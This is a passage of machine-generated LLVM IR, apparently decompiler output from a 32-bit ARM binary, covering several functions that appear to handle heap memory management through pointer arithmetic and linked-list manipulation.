  %v2_148a0 = sub i32 0, %v3_1488c
  %v3_148a0 = and i32 %v2_1489c, %v2_148a0
  store i32 %v3_148a0, i32* @r7, align 4
  %v2_148a4 = sub i32 %v3_148a0, %v3_14888
  store i32 %v2_148a4, i32* @fp, align 4
  %v9_148a8 = icmp eq i32 %v1_1469c, %v2_148a4
  br i1 %v9_148a8, label %dec_label_pc_1491c, label %dec_label_pc_148b0

dec_label_pc_148b0:                               ; preds = %dec_label_pc_1487c
  %v2_148b0 = sub i32 %v1_14698, %v3_14888
  store i32 %v2_148b0, i32* %r0.global-to-local, align 4
  %v2_148b4 = add i32 %v3_14888, %v1_1469c
  store i32 %v2_148b4, i32* %r1.global-to-local, align 4
  store i32 %v3_148a0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_148c0 = call i32 @function_16440(i32 %v2_148b0, i32 %v2_148b4, i32 %v3_148a0, i32 1)
  store i32 %v4_148c0, i32* %r0.global-to-local, align 4
  %v7_148c4 = icmp eq i32 %v4_148c0, -1
  br i1 %v7_148c4, label %dec_label_pc_14910, label %dec_label_pc_148cc

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148b0
  %v1_148cc = load i32, i32* @r4, align 4
  %v2_148cc = add i32 %v1_148cc, %v4_148c0
  store i32 %v2_148cc, i32* %r0.global-to-local, align 4
  %v0_148d0 = load i32, i32* @fp, align 4
  %v1_148d0 = or i32 %v0_148d0, 2
  store i32 %v1_148d0, i32* %r3.global-to-local, align 4
  %v2_148d4 = add i32 %v2_148cc, 4
  %v3_148d4 = inttoptr i32 %v2_148d4 to i32*
  store i32 %v1_148d0, i32* %v3_148d4, align 4
  %v0_148d8 = load i32, i32* @r8, align 4
  %v1_148d8 = add i32 %v0_148d8, 868
  %v2_148d8 = inttoptr i32 %v1_148d8 to i32*
  %v3_148d8 = load i32, i32* %v2_148d8, align 4
  store i32 %v3_148d8, i32* %r3.global-to-local, align 4
  %v1_148dc = add i32 %v0_148d8, 880
  %v2_148dc = inttoptr i32 %v1_148dc to i32*
  %v3_148dc = load i32, i32* %v2_148dc, align 4
  store i32 %v3_148dc, i32* %r2.global-to-local, align 4
  %v0_148e0 = load i32, i32* @r6, align 4
  %v2_148e0 = sub i32 %v3_148d8, %v0_148e0
  store i32 %v2_148e0, i32* %r3.global-to-local, align 4
  %v1_148e4 = load i32, i32* @r7, align 4
  %v2_148e4 = add i32 %v1_148e4, %v2_148e0
  store i32 %v2_148e4, i32* %r1.global-to-local, align 4
  %v1_148e8 = add i32 %v0_148d8, 872
  %v2_148e8 = inttoptr i32 %v1_148e8 to i32*
  %v3_148e8 = load i32, i32* %v2_148e8, align 4
  store i32 %v3_148e8, i32* %r3.global-to-local, align 4
  %v1_148f0 = add i32 %v0_148d8, 884
  %v2_148f0 = inttoptr i32 %v1_148f0 to i32*
  %v3_148f0 = load i32, i32* %v2_148f0, align 4
  store i32 %v3_148f0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_148e4, %v3_148dc
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_148cc
  store i32 %v2_148e4, i32* %v2_148dc, align 4
  %v0_148f8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_148f8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_148cc, %bb33
  %v1_148f8 = phi i32 [ %v0_148d8, %dec_label_pc_148cc ], [ %v1_148f8.pre, %bb33 ]
  %v0_148f8 = phi i32 [ %v2_148e4, %dec_label_pc_148cc ], [ %v0_148f8.pre, %bb33 ]
  %v2_148f8 = add i32 %v1_148f8, 868
  %v3_148f8 = inttoptr i32 %v2_148f8 to i32*
  store i32 %v0_148f8, i32* %v3_148f8, align 4
  %v0_148fc = load i32, i32* %r1.global-to-local, align 4
  %v1_148fc = load i32, i32* %r3.global-to-local, align 4
  %v2_148fc = add i32 %v1_148fc, %v0_148fc
  store i32 %v2_148fc, i32* %r1.global-to-local, align 4
  %v1_14900 = load i32, i32* %r2.global-to-local, align 4
  %v0_14904 = load i32, i32* %r0.global-to-local, align 4
  %v1_14904 = add i32 %v0_14904, 8
  store i32 %v1_14904, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_148fc, %v1_14900
  br i1 %tmp43, label %bb35, label %dec_label_pc_14948

bb35:                                             ; preds = %bb34
  %v5_14908 = load i32, i32* @r8, align 4
  %v6_14908 = add i32 %v5_14908, 884
  %v7_14908 = inttoptr i32 %v6_14908 to i32*
  store i32 %v2_148fc, i32* %v7_14908, align 4
  br label %dec_label_pc_14948

dec_label_pc_14910:                               ; preds = %dec_label_pc_148b0
  %v0_14910 = load i32, i32* @sb, align 4
  %v1_14910 = add i32 %v0_14910, 4
  store i32 %v1_14910, i32* %r3.global-to-local, align 4
  %v0_14914 = load i32, i32* @r6, align 4
  %v3_14914 = icmp ult i32 %v0_14914, %v1_14910
  br i1 %v3_14914, label %dec_label_pc_14924, label %dec_label_pc_14910.dec_label_pc_1491c_crit_edge

dec_label_pc_14910.dec_label_pc_1491c_crit_edge:  ; preds = %dec_label_pc_14910
  %v0_1491c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1491c

dec_label_pc_1491c:                               ; preds = %dec_label_pc_14910.dec_label_pc_1491c_crit_edge, %dec_label_pc_1487c
  %v0_1491c = phi i32 [ %v0_1491c.pre, %dec_label_pc_14910.dec_label_pc_1491c_crit_edge ], [ %v0_14684, %dec_label_pc_1487c ]
  store i32 %v0_1491c, i32* @r4, align 4
  br label %dec_label_pc_14948

dec_label_pc_14924:                               ; preds = %dec_label_pc_14910
  %v1_14924 = add i32 %v0_14910, -7
  store i32 %v1_14924, i32* @r0, align 4
  %v0_14928 = call i32 @function_13b88()
  store i32 %v0_14928, i32* @r0, align 4
  store i32 %v0_14928, i32* @r4, align 4
  %v2_1492c = icmp eq i32 %v0_14928, 0
  br i1 %v2_1492c, label %dec_label_pc_14948, label %dec_label_pc_14934

dec_label_pc_14934:                               ; preds = %dec_label_pc_14924
  %v0_14934 = load i32, i32* @r6, align 4
  %v1_14934 = add i32 %v0_14934, -8
  store i32 %v1_14934, i32* @r2, align 4
  %v0_14938 = load i32, i32* @r5, align 4
  store i32 %v0_14938, i32* @r1, align 4
  %v0_1493c = call i32 @function_13680()
  %v0_14940 = load i32, i32* @r5, align 4
  store i32 %v0_14940, i32* @r0, align 4
  %v0_14944 = call i32 @function_14bf4()
  store i32 %v0_14944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_14924, %dec_label_pc_1491c, %dec_label_pc_14874, %.thread6, %dec_label_pc_146e4, %dec_label_pc_14934
  store i32 %v2_14638, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 135344, i32* %r2.global-to-local, align 4
  %v4_14958 = load i32, i32* inttoptr (i32 135368 to i32*), align 8
  store i32 %v4_14958, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14958)
  br label %dec_label_pc_14964

dec_label_pc_14964:                               ; preds = %dec_label_pc_1466c, %dec_label_pc_14614, %dec_label_pc_145fc, %dec_label_pc_14948
  %v0_14964 = load i32, i32* @r4, align 4
  store i32 %v0_14964, i32* %r0.global-to-local, align 4
  store i32 %v3_145dc, i32* @r4, align 4
  store i32 %v6_145dc, i32* @r5, align 4
  store i32 %v9_145dc, i32* @r6, align 4
  store i32 %v12_145dc, i32* @r7, align 4
  store i32 %v15_145dc, i32* @r8, align 4
  store i32 %v18_145dc, i32* @sb, align 4
  store i32 %v21_145dc, i32* @sl, align 4
  store i32 %v24_145dc, i32* @fp, align 4
  store i32 %v27_145dc, i32* @lr, align 4
  ret i32 %v0_14964

; uselistorder directives
  uselistorder i32 %v2_148fc, { 1, 0, 2 }
  uselistorder i32 %v2_148e4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_148c0, { 1, 0, 2 }
  uselistorder i32 %v3_148a0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14844, { 2, 1, 0 }
  uselistorder i32 %v2_14814, { 1, 0, 2 }
  uselistorder i32 %v0_147a8, { 1, 0 }
  uselistorder i32 %v0_14764, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_146c8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_146c0, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_146a4, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1469c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_14698, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_14688, { 1, 0 }
  uselistorder i32 %v0_14684, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14664, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 27, 7, 12, 8, 9, 10, 11, 22, 13, 15, 14, 21, 23, 16, 17, 18, 19, 20, 26, 25, 24, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14964, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14948, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_14874, { 1, 0 }
  uselistorder label %dec_label_pc_14814, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14760, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14754, { 1, 0 }
  uselistorder label %dec_label_pc_14750, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_14978(i32 %arg1) local_unnamed_addr {
dec_label_pc_14978:
  %v0_14978 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14978, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_14978
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14978, %bb
  %v10_1498c = phi i32 [ %arg1, %dec_label_pc_14978 ], [ 0, %bb ]
  ret i32 %v10_1498c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_14990(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14990:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_14990 = add i32 %arg2, 44
  %v2_14990 = inttoptr i32 %v1_14990 to i32*
  %v3_14990 = load i32, i32* %v2_14990, align 4
  %v1_14998 = add i32 %v3_14990, 4
  %v2_14998 = inttoptr i32 %v1_14998 to i32*
  %v3_14998 = load i32, i32* %v2_14998, align 4
  %v1_1499c = add i32 %arg2, 860
  %v2_1499c = inttoptr i32 %v1_1499c to i32*
  %v3_1499c = load i32, i32* %v2_1499c, align 4
  store i32 %v3_1499c, i32* @r4, align 4
  %v1_149a0 = and i32 %v3_14998, -4
  store i32 %v1_149a0, i32* @r6, align 4
  %v1_149a4 = add i32 %v1_149a0, -17
  %v2_149a8 = add i32 %v1_149a4, %v3_1499c
  store i32 %arg2, i32* @r5, align 4
  %v2_149b4 = sub i32 %v2_149a8, %arg1
  store i32 %v2_149b4, i32* @r0, align 4
  store i32 %v3_1499c, i32* @r1, align 4
  %v0_149bc = call i32 @function_12a70()
  %v1_149c0 = add i32 %v0_149bc, -1
  store i32 %v1_149c0, i32* %r0.global-to-local, align 4
  %v0_149c4 = load i32, i32* @r4, align 4
  %v2_149c4 = mul i32 %v0_149c4, %v1_149c0
  store i32 %v2_149c4, i32* %r7.global-to-local, align 4
  %v2_149c8 = icmp eq i32 %v2_149c4, 0
  store i1 %v2_149c8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_149c4, 1
  br i1 %tmp8, label %dec_label_pc_14a30, label %dec_label_pc_149d0

dec_label_pc_149d0:                               ; preds = %dec_label_pc_14990
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_149d4 = call i32 @function_160fc(i32 0)
  store i32 %v1_149d4, i32* %r0.global-to-local, align 4
  %v0_149d8 = load i32, i32* @r5, align 4
  %v1_149d8 = add i32 %v0_149d8, 44
  %v2_149d8 = inttoptr i32 %v1_149d8 to i32*
  %v3_149d8 = load i32, i32* %v2_149d8, align 4
  %v0_149dc = load i32, i32* @r6, align 4
  %v2_149dc = add i32 %v0_149dc, %v3_149d8
  %v9_149e0 = icmp eq i32 %v1_149d4, %v2_149dc
  store i1 %v9_149e0, i1* @cpsr_z, align 1
  store i32 %v1_149d4, i32* @r4, align 4
  br i1 %v9_149e0, label %dec_label_pc_149ec, label %dec_label_pc_14a30

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149d0
  %v0_149ec = load i32, i32* %r7.global-to-local, align 4
  %v1_149ec = sub i32 0, %v0_149ec
  store i32 %v1_149ec, i32* %r0.global-to-local, align 4
  %v1_149f0 = call i32 @function_160fc(i32 %v1_149ec)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_149f8 = call i32 @function_160fc(i32 0)
  store i32 %v1_149f8, i32* %r0.global-to-local, align 4
  %v7_149fc = icmp eq i32 %v1_149f8, -1
  store i1 %v7_149fc, i1* @cpsr_z, align 1
  br i1 %v7_149fc, label %dec_label_pc_14a30, label %dec_label_pc_14a04

dec_label_pc_14a04:                               ; preds = %dec_label_pc_149ec
  %v0_14a04 = load i32, i32* @r4, align 4
  %v2_14a04 = sub i32 %v0_14a04, %v1_149f8
  store i32 %v2_14a04, i32* %r0.global-to-local, align 4
  %v9_14a04 = icmp eq i32 %v0_14a04, %v1_149f8
  store i1 %v9_14a04, i1* @cpsr_z, align 1
  br i1 %v9_14a04, label %dec_label_pc_14a30, label %dec_label_pc_14a0c

dec_label_pc_14a0c:                               ; preds = %dec_label_pc_14a04
  %v0_14a0c = load i32, i32* @r5, align 4
  %v1_14a0c = add i32 %v0_14a0c, 872
  %v2_14a0c = inttoptr i32 %v1_14a0c to i32*
  %v3_14a0c = load i32, i32* %v2_14a0c, align 4
  %v1_14a10 = load i32, i32* @r6, align 4
  %v2_14a10 = sub i32 %v1_14a10, %v2_14a04
  store i32 %v2_14a10, i32* %r2.global-to-local, align 4
  %v1_14a14 = add i32 %v0_14a0c, 44
  %v2_14a14 = inttoptr i32 %v1_14a14 to i32*
  %v3_14a14 = load i32, i32* %v2_14a14, align 4
  store i32 %v3_14a14, i32* %r1.global-to-local, align 4
  %v2_14a18 = sub i32 %v3_14a0c, %v2_14a04
  %v1_14a1c = or i32 %v2_14a10, 1
  store i32 %v1_14a1c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_14a18, i32* %v2_14a0c, align 4
  %v0_14a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_14a28 = load i32, i32* %r1.global-to-local, align 4
  %v2_14a28 = add i32 %v1_14a28, 4
  %v3_14a28 = inttoptr i32 %v2_14a28 to i32*
  store i32 %v0_14a28, i32* %v3_14a28, align 4
  %v1_14a3c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14a30:                               ; preds = %dec_label_pc_149d0, %dec_label_pc_14a04, %dec_label_pc_149ec, %dec_label_pc_14990
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a0c, %dec_label_pc_14a30
  %v1_14a3c = phi i32 [ %v1_14a3c.pre, %dec_label_pc_14a0c ], [ 0, %dec_label_pc_14a30 ]
  ret i32 %v1_14a3c

; uselistorder directives
  uselistorder i1 %v7_149fc, { 1, 0 }
  uselistorder i32 %v1_149f8, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_160fc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14a34, { 1, 0 }
  uselistorder label %dec_label_pc_14a30, { 1, 2, 0, 3 }
}

define i32 @function_14a40() local_unnamed_addr {
dec_label_pc_14a40:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14a40 = load i32, i32* @r4, align 4
  store i32 %v3_14a40, i32* %stack_var_-36, align 4
  %v0_14a44 = load i32, i32* @r0, align 4
  %v1_14a44 = inttoptr i32 %v0_14a44 to i32*
  %v2_14a44 = load i32, i32* %v1_14a44, align 4
  store i32 %v2_14a44, i32* %r3.global-to-local, align 4
  %v2_14a48 = icmp eq i32 %v2_14a44, 0
  store i32 %v0_14a44, i32* @r4, align 4
  br i1 %v2_14a48, label %dec_label_pc_14b80.preheader, label %dec_label_pc_14a5c

dec_label_pc_14b80.preheader:                     ; preds = %dec_label_pc_14a40
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_14b8825 = add i32 %v0_14a44, 52
  store i32 %v1_14b8825, i32* %r3.global-to-local, align 4
  %v2_14b9026 = add i32 %v0_14a44, 60
  %v3_14b9027 = inttoptr i32 %v2_14b9026 to i32*
  store i32 %v1_14b8825, i32* %v3_14b9027, align 4
  %v0_14b9428 = load i32, i32* %r3.global-to-local, align 4
  %v2_14b9429 = add i32 %v0_14b9428, 12
  %v3_14b9430 = inttoptr i32 %v2_14b9429 to i32*
  store i32 %v0_14b9428, i32* %v3_14b9430, align 4
  br label %dec_label_pc_14b80.dec_label_pc_14b80_crit_edge

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a40
  %v1_14a5c = and i32 %v2_14a44, -3
  %v3_14a60 = udiv i32 %v2_14a44, 8
  store i32 %v3_14a60, i32* %r2.global-to-local, align 4
  store i32 %v1_14a5c, i32* %v1_14a44, align 4
  %v0_14a68 = load i32, i32* @r0, align 4
  %v1_14a68 = add i32 %v0_14a68, -4
  store i32 %v1_14a68, i32* %r3.global-to-local, align 4
  %v1_14a6c = load i32, i32* %r2.global-to-local, align 4
  %v4_14a6c = mul i32 %v1_14a6c, 4
  %v5_14a6c = add i32 %v4_14a6c, %v1_14a68
  store i32 %v5_14a6c, i32* %sb.global-to-local, align 4
  %v1_14a70 = add i32 %v0_14a68, 52
  store i32 %v1_14a70, i32* %r7.global-to-local, align 4
  %v1_14a74 = add i32 %v0_14a68, 4
  store i32 %v1_14a74, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %dec_label_pc_14b78, %dec_label_pc_14a5c
  %v1_14b7010 = phi i32 [ %v1_14b70, %dec_label_pc_14b78 ], [ %v5_14a6c, %dec_label_pc_14a5c ]
  %v1_14a88 = phi i32 [ %v1_14b78, %dec_label_pc_14b78 ], [ %v1_14a74, %dec_label_pc_14a5c ]
  %v1_14a7c = inttoptr i32 %v1_14a88 to i32*
  %v2_14a7c = load i32, i32* %v1_14a7c, align 4
  store i32 %v2_14a7c, i32* %r1.global-to-local, align 4
  %v2_14a80 = icmp eq i32 %v2_14a7c, 0
  br i1 %v2_14a80, label %dec_label_pc_14b70, label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a7c
  %v0_14a88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14a88, i32* %v1_14a7c, align 4
  %v0_14a8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14b64, %dec_label_pc_14a88
  %v0_14aa8 = phi i32 [ %v0_14b64, %dec_label_pc_14b64 ], [ %v0_14a8c.pre, %dec_label_pc_14a88 ]
  %v1_14a8c = add i32 %v0_14aa8, 4
  %v2_14a8c = inttoptr i32 %v1_14a8c to i32*
  %v3_14a8c = load i32, i32* %v2_14a8c, align 4
  store i32 %v3_14a8c, i32* %r3.global-to-local, align 4
  %v1_14a90 = and i32 %v3_14a8c, -2
  store i32 %v1_14a90, i32* %lr.global-to-local, align 4
  %v2_14a94 = add i32 %v1_14a90, %v0_14aa8
  store i32 %v2_14a94, i32* @r0, align 4
  %v1_14a98 = urem i32 %v3_14a8c, 2
  %v2_14a98 = icmp eq i32 %v1_14a98, 0
  %v1_14a9c = add i32 %v0_14aa8, 8
  %v2_14a9c = inttoptr i32 %v1_14a9c to i32*
  %v3_14a9c = load i32, i32* %v2_14a9c, align 4
  store i32 %v3_14a9c, i32* %sl.global-to-local, align 4
  %v1_14aa0 = add i32 %v2_14a94, 4
  %v2_14aa0 = inttoptr i32 %v1_14aa0 to i32*
  %v3_14aa0 = load i32, i32* %v2_14aa0, align 4
  store i32 %v3_14aa0, i32* %r8.global-to-local, align 4
  br i1 %v2_14a98, label %dec_label_pc_14aa8, label %dec_label_pc_14adc

dec_label_pc_14aa8:                               ; preds = %dec_label_pc_14a8c
  %v1_14aa8 = inttoptr i32 %v0_14aa8 to i32*
  %v2_14aa8 = load i32, i32* %v1_14aa8, align 4
  store i32 %v2_14aa8, i32* %r5.global-to-local, align 4
  %v2_14aac = sub i32 %v0_14aa8, %v2_14aa8
  store i32 %v2_14aac, i32* %r3.global-to-local, align 4
  %v1_14ab0 = add i32 %v2_14aac, 8
  %v2_14ab0 = inttoptr i32 %v1_14ab0 to i32*
  %v3_14ab0 = load i32, i32* %v2_14ab0, align 4
  store i32 %v3_14ab0, i32* @ip, align 4
  %v1_14ab4 = add i32 %v3_14ab0, 12
  %v2_14ab4 = inttoptr i32 %v1_14ab4 to i32*
  %v3_14ab4 = load i32, i32* %v2_14ab4, align 4
  store i32 %v3_14ab4, i32* %r1.global-to-local, align 4
  %v9_14ab8 = icmp eq i32 %v3_14ab4, %v2_14aac
  %v1_14abc = add i32 %v2_14aac, 12
  %v2_14abc = inttoptr i32 %v1_14abc to i32*
  %v3_14abc = load i32, i32* %v2_14abc, align 4
  store i32 %v3_14abc, i32* %r2.global-to-local, align 4
  br i1 %v9_14ab8, label %dec_label_pc_14ac4, label %dec_label_pc_14b20

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14aa8
  %v1_14ac4 = add i32 %v3_14abc, 8
  %v2_14ac4 = inttoptr i32 %v1_14ac4 to i32*
  %v3_14ac4 = load i32, i32* %v2_14ac4, align 4
  store i32 %v3_14ac4, i32* %r3.global-to-local, align 4
  %v9_14ac8 = icmp eq i32 %v3_14ac4, %v2_14aac
  br i1 %v9_14ac8, label %dec_label_pc_14ad0, label %dec_label_pc_14b20

dec_label_pc_14ad0:                               ; preds = %dec_label_pc_14ac4
  store i32 %v3_14ab0, i32* %v2_14ac4, align 4
  %v0_14ad4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ad4 = load i32, i32* @ip, align 4
  %v2_14ad4 = add i32 %v1_14ad4, 12
  %v3_14ad4 = inttoptr i32 %v2_14ad4 to i32*
  store i32 %v0_14ad4, i32* %v3_14ad4, align 4
  %v0_14ad8 = load i32, i32* %lr.global-to-local, align 4
  %v1_14ad8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ad8 = add i32 %v1_14ad8, %v0_14ad8
  store i32 %v2_14ad8, i32* %lr.global-to-local, align 4
  %v0_14ae0.pre = load i32, i32* @r0, align 4
  %v0_14ae4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14adc

dec_label_pc_14adc:                               ; preds = %dec_label_pc_14a8c, %dec_label_pc_14ad0
  %v0_14b54 = phi i32 [ %v1_14a90, %dec_label_pc_14a8c ], [ %v2_14ad8, %dec_label_pc_14ad0 ]
  %v0_14ae4 = phi i32 [ %v3_14aa0, %dec_label_pc_14a8c ], [ %v0_14ae4.pre, %dec_label_pc_14ad0 ]
  %v1_14af8 = phi i32 [ %v2_14a94, %dec_label_pc_14a8c ], [ %v0_14ae0.pre, %dec_label_pc_14ad0 ]
  %v0_14adc = load i32, i32* @r4, align 4
  %v1_14adc = add i32 %v0_14adc, 44
  %v2_14adc = inttoptr i32 %v1_14adc to i32*
  %v3_14adc = load i32, i32* %v2_14adc, align 4
  store i32 %v3_14adc, i32* %r3.global-to-local, align 4
  %v9_14ae0 = icmp eq i32 %v1_14af8, %v3_14adc
  %v1_14ae4 = and i32 %v0_14ae4, -4
  store i32 %v1_14ae4, i32* %r5.global-to-local, align 4
  br i1 %v9_14ae0, label %dec_label_pc_14b54, label %dec_label_pc_14aec

dec_label_pc_14aec:                               ; preds = %dec_label_pc_14adc
  %v2_14aec = add i32 %v1_14af8, %v1_14ae4
  store i32 %v2_14aec, i32* %r3.global-to-local, align 4
  %v1_14af0 = add i32 %v2_14aec, 4
  %v2_14af0 = inttoptr i32 %v1_14af0 to i32*
  %v3_14af0 = load i32, i32* %v2_14af0, align 4
  store i32 %v3_14af0, i32* %r3.global-to-local, align 4
  %v1_14af4 = urem i32 %v3_14af0, 2
  %v2_14af4 = icmp eq i32 %v1_14af4, 0
  %v2_14af8 = add i32 %v1_14af8, 4
  %v3_14af8 = inttoptr i32 %v2_14af8 to i32*
  store i32 %v1_14ae4, i32* %v3_14af8, align 4
  br i1 %v2_14af4, label %dec_label_pc_14b00, label %dec_label_pc_14aec.dec_label_pc_14b30_crit_edge

dec_label_pc_14aec.dec_label_pc_14b30_crit_edge:  ; preds = %dec_label_pc_14aec
  %v0_14b34.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14aec
  %v0_14b00 = load i32, i32* @r0, align 4
  %v1_14b00 = add i32 %v0_14b00, 8
  %v2_14b00 = inttoptr i32 %v1_14b00 to i32*
  %v3_14b00 = load i32, i32* %v2_14b00, align 4
  store i32 %v3_14b00, i32* @ip, align 4
  %v1_14b04 = add i32 %v3_14b00, 12
  %v2_14b04 = inttoptr i32 %v1_14b04 to i32*
  %v3_14b04 = load i32, i32* %v2_14b04, align 4
  store i32 %v3_14b04, i32* %r3.global-to-local, align 4
  %v9_14b08 = icmp eq i32 %v3_14b04, %v0_14b00
  %v1_14b0c = add i32 %v0_14b00, 12
  %v2_14b0c = inttoptr i32 %v1_14b0c to i32*
  %v3_14b0c = load i32, i32* %v2_14b0c, align 4
  store i32 %v3_14b0c, i32* %r2.global-to-local, align 4
  br i1 %v9_14b08, label %dec_label_pc_14b14, label %dec_label_pc_14b20

dec_label_pc_14b14:                               ; preds = %dec_label_pc_14b00
  %v1_14b14 = add i32 %v3_14b0c, 8
  %v2_14b14 = inttoptr i32 %v1_14b14 to i32*
  %v3_14b14 = load i32, i32* %v2_14b14, align 4
  store i32 %v3_14b14, i32* %r3.global-to-local, align 4
  %v9_14b18 = icmp eq i32 %v3_14b14, %v0_14b00
  br i1 %v9_14b18, label %dec_label_pc_14b24, label %dec_label_pc_14b20

dec_label_pc_14b20:                               ; preds = %dec_label_pc_14b00, %dec_label_pc_14ac4, %dec_label_pc_14aa8, %dec_label_pc_14b14
  %v0_14b20 = call i32 @function_14e70()
  store i32 %v0_14b20, i32* @r0, align 4
  %v0_14b24.pre = load i32, i32* @ip, align 4
  %v1_14b24.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14b24

dec_label_pc_14b24:                               ; preds = %dec_label_pc_14b14, %dec_label_pc_14b20
  %v1_14b24 = phi i32 [ %v3_14b0c, %dec_label_pc_14b14 ], [ %v1_14b24.pre, %dec_label_pc_14b20 ]
  %v0_14b24 = phi i32 [ %v3_14b00, %dec_label_pc_14b14 ], [ %v0_14b24.pre, %dec_label_pc_14b20 ]
  %v2_14b24 = add i32 %v1_14b24, 8
  %v3_14b24 = inttoptr i32 %v2_14b24 to i32*
  store i32 %v0_14b24, i32* %v3_14b24, align 4
  %v0_14b28 = load i32, i32* %r2.global-to-local, align 4
  %v1_14b28 = load i32, i32* @ip, align 4
  %v2_14b28 = add i32 %v1_14b28, 12
  %v3_14b28 = inttoptr i32 %v2_14b28 to i32*
  store i32 %v0_14b28, i32* %v3_14b28, align 4
  %v0_14b2c = load i32, i32* %lr.global-to-local, align 4
  %v1_14b2c = load i32, i32* %r5.global-to-local, align 4
  %v2_14b2c = add i32 %v1_14b2c, %v0_14b2c
  store i32 %v2_14b2c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14b30

dec_label_pc_14b30:                               ; preds = %dec_label_pc_14aec.dec_label_pc_14b30_crit_edge, %dec_label_pc_14b24
